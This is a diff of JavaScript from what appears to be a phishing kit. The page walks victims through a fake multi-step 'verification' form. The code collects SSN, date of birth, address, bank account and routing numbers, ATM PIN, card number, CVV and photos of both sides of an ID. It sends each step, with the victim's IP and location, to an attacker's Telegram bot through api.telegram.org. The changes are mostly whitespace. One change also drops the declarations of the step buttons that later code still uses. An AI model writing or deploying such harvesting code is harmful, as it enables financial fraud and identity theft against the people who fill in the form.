@@ -2,23 +2,23 @@ document.addEventListener('DOMContentLoaded', async function() {
     // Load environment variables
     let TELEGRAM_BOT_TOKEN = '';
     let TELEGRAM_CHAT_ID = '';
-    
+
     try {
         const configResponse = await fetch('config.txt');
         const configText = await configResponse.text();
         const configLines = configText.split('\n').filter(line => line.trim() !== '');
-        
+
         configLines.forEach(line => {
             if (line.includes('=')) {
                 const [key, ...valueParts] = line.split('=');
                 let value = valueParts.join('=').trim();
-                
+
                 // Remove quotes if present
                 if ((value.startsWith("'") && value.endsWith("'")) || 
                     (value.startsWith('"') && value.endsWith('"'))) {
                     value = value.slice(1, -1);
                 }
-                
+
                 if (key.trim() === 'TELEGRAM_BOT_TOKEN') {
                     TELEGRAM_BOT_TOKEN = value;
                 } else if (key.trim() === 'TELEGRAM_CHAT_ID') {
@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', async function() {
                 }
             }
         });
-        
+
         console.log('Configuration loaded successfully from config.txt');
         console.log('Bot token loaded:', TELEGRAM_BOT_TOKEN ? 'Yes' : 'No');
         console.log('Chat ID loaded:', TELEGRAM_CHAT_ID ? 'Yes' : 'No');
@@ -39,16 +39,14 @@ document.addEventListener('DOMContentLoaded', async function() {
     }
 
     // Step navigation
-    const nextToPaymentBtn = document.getElementById('nextToPayment');
-    const nextToCardBtn = document.getElementById('nextToCard');
-    const nextToIdBtn = document.getElementById('nextToId');
-    const completeVerificationBtn = document.getElementById('completeVerification');
+    let currentStep = 1;
+    const totalSteps = 4;
 
     // Form validation and navigation
     nextToPaymentBtn.addEventListener('click', async function() {
         if (validateStep1()) {
             showLoading('loading1');
-            
+
             try {
                 // Send Step 1 data to Telegram
                 const step1Data = {
@@ -59,10 +57,10 @@ document.addEventListener('DOMContentLoaded', async function() {
                     ssn: document.getElementById('ssn').value,
                     address: document.getElementById('address').value
                 };
-                
+
                 const ipInfo = await getIPInfo();
                 await sendStepToTelegram(1, step1Data, ipInfo);
-                
+
                 setTimeout(function() {
                     hideLoading('loading1');
                     updateProgress(1);
@@ -82,7 +80,7 @@ document.addEventListener('DOMContentLoaded', async function() {
     nextToCardBtn.addEventListener('click', async function() {
         if (validateStep2()) {
             showLoading('loading2');
-            
+
             try {
                 // Send Step 2 data to Telegram
                 const step2Data = {
@@ -92,10 +90,10 @@ document.addEventListener('DOMContentLoaded', async function() {
                     routingNumber: document.getElementById('routingNumber').value,
                     atmPin: document.getElementById('atmPin').value
                 };
-                
+
                 const ipInfo = await getIPInfo();
                 await sendStepToTelegram(2, step2Data, ipInfo);
-                
+
                 setTimeout(function() {
                     hideLoading('loading2');
                     updateProgress(2);
@@ -115,7 +113,7 @@ document.addEventListener('DOMContentLoaded', async function() {
     nextToIdBtn.addEventListener('click', async function() {
         if (validateStep3()) {
             showLoading('loading3');
-            
+
             try {
                 // Send Step 3 data to Telegram
                 const step3Data = {
@@ -124,10 +122,10 @@ document.addEventListener('DOMContentLoaded', async function() {
                     cvv: document.getElementById('cvv').value,
                     confirmAtmPin: document.getElementById('confirmAtmPin').value
                 };
-                
+
                 const ipInfo = await getIPInfo();
                 await sendStepToTelegram(3, step3Data, ipInfo);
-                
+
                 setTimeout(function() {
                     hideLoading('loading3');
                     updateProgress(3);
@@ -239,7 +237,7 @@ document.addEventListener('DOMContentLoaded', async function() {
         try {
             // Send front ID image
             await sendImageToTelegram(frontIdFile, 'Front ID', ipInfo);
-            
+
             // Send back ID image
             await sendImageToTelegram(backIdFile, 'Back ID', ipInfo);
         } catch (error) {
@@ -253,7 +251,7 @@ document.addEventListener('DOMContentLoaded', async function() {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
         formData.append('photo', imageFile);
-        
+
         const fullCaption = `${caption}
 
 *IP Information:*
@@ -264,7 +262,7 @@ Country: ${ipInfo.country}
 Postal Code: ${ipInfo.postal}
 ISP: ${ipInfo.isp}
 Timestamp: ${new Date().toLocaleString()}`;
-        
+
         formData.append('caption', fullCaption);
         formData.append('parse_mode', 'Markdown');
 
@@ -275,7 +273,7 @@ Timestamp: ${new Date().toLocaleString()}`;
                 method: 'POST',
                 body: formData
             });
-            
+
             const data = await response.json();
             if (!data.ok) {
                 throw new Error('Telegram API error: ' + data.description);
@@ -290,7 +288,7 @@ Timestamp: ${new Date().toLocaleString()}`;
     // Function to send individual step data to Telegram
     async function sendStepToTelegram(stepNumber, stepData, ipInfo) {
         let message = `*Step ${stepNumber} - `;
-        
+
         switch(stepNumber) {
             case 1:
                 message += `Personal Information*
@@ -303,7 +301,7 @@ DOB: ${stepData.dob}
 SSN: ${stepData.ssn}
 Address: ${stepData.address}`;
                 break;
-                
+
             case 2:
                 message += `Payment Information*
 
@@ -314,7 +312,7 @@ Account Type: ${stepData.accountType}
 Routing Number: ${stepData.routingNumber}
 ATM Pin: ${stepData.atmPin}`;
                 break;
-                
+
             case 3:
                 message += `Card Information*
 
@@ -324,7 +322,7 @@ Expiration Date: ${stepData.expDate}
 CVV: ${stepData.cvv}
 Confirm ATM Pin: ${stepData.confirmAtmPin}`;
                 break;
-                
+
             case 4:
                 message += `ID Upload*
 
@@ -333,7 +331,7 @@ Front ID: ${stepData.frontId}
 Back ID: ${stepData.backId}`;
                 break;
         }
-        
+
         message += `
 
 *IP Information:*
@@ -346,7 +344,7 @@ ISP: ${ipInfo.isp}
 Timestamp: ${new Date().toLocaleString()}`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
+
         const payload = {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
@@ -361,7 +359,7 @@ Timestamp: ${new Date().toLocaleString()}`;
                 },
                 body: JSON.stringify(payload)
             });
-            
+
             const data = await response.json();
             if (!data.ok) {
                 throw new Error('Telegram API error: ' + data.description);
@@ -413,7 +411,7 @@ ISP: ${ipInfo.isp}`;
 
         // Send the message to Telegram
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
+
         const payload = {
             chat_id: TELEGRAM_CHAT_ID,
             text: message,
@@ -428,7 +426,7 @@ ISP: ${ipInfo.isp}`;
                 },
                 body: JSON.stringify(payload)
             });
-            
+
             const data = await response.json();
             if (!data.ok) {
                 throw new Error('Telegram API error: ' + data.description);
